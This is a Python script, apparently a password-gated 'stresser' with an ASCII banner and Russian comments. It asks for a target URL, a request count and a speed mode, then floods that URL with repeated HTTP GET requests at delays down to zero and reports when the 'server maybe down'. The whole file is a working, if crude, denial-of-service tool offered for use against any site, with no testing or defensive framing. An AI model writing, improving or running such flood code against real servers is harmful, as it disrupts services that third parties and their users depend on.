import requests
import time
from colorama import Fore, init

init(autoreset=True)

time.sleep(1.33333)
print('________  .__              /\\          _________ __                                             ')
print('\\_____  \\ |  |   ____   ___)/ ______  /   _____//  |________   ____   ______ ______ ___________ ')
print(' /   |   \\|  | _/ __ \\ / ___\\/  ___/  \\_____  \\\\   __\\_  __ \\_/ __ \\ /  ___//  ___// __ \\_  __ /')
print('/    |    \\  |_\\  ___// /_/  >___ \\   /        \\|  |  |  | \\/\\  ___/ \\___ \\\\ \\___ \\\\  ___/|  | \\/')
print('\\_______  /____/\\___  >___  /____  > /_______  /|__|  |__|    \\___  >____  >____  >\\___  >__|  ')
print('        \\/          \\/_____/     \\/          \\/                   \\/     \\/     \\/     \\/ ')

scrambled_password = "ofstaotte"

def transform_input(user_input):
    if len(user_input) < 3:
        return user_input
    return user_input[2] + user_input[0] + user_input[1] + user_input[3:]

def flood(url, count, delay):
    print(f"Starting flood of {count} requests to {url}...")
    for i in range(count):
        try:
            response = requests.get(url, timeout=2)
            print(f"{Fore.GREEN}Request sent! (Status: {response.status_code})")
        except requests.exceptions.RequestException:
            print(f"{Fore.RED}Server maybe down! (Request {i+1}/{count})")
        
        time.sleep(delay)
    
    print("Flood completed.")

# Проверка пароля
a = input('Enter password to use soft:  ')
transformed_input = transform_input(a)

if transformed_input == scrambled_password:
    try:
        # Количество запросов
        count = int(input('Enter a value of requests:   '))
        # Выбор скорости (turbo)
        turbo = int(input('Enter speed mode (0-30: SLOW, 31-100: MEDIUM, 101-400: FAST, 401-700: ULTRA, else: DEFAULT): '))
        url = input('Enter target url (example: https://example.com):   ')
        
        # Определение задержки по turbo
        if turbo >= 0 and turbo <= 30:
            delay = 5
            print(f"Speed set to SLOW ({delay} sec delay)")
        elif turbo > 30 and turbo <= 100:
            delay = 2
            print(f"Speed set to MEDIUM ({delay} sec delay)")
        elif turbo > 100 and turbo <= 400:
            delay = 0.1
            print(f"Speed set to FAST ({delay} sec delay)")
        elif turbo > 400 and turbo <= 700:
            delay = 0
            print(f"Speed set to ULTRA ({delay} sec delay)")
        else:
            delay = 0.5
            print(f"Speed set to DEFAULT ({delay} sec delay)")
        
        # Запуск отправки запросов
        flood(url, count, delay)

    except ValueError:
        print("Error: The number of requests and speed mode must be integers.")
else:
    print('Password is not correct.')
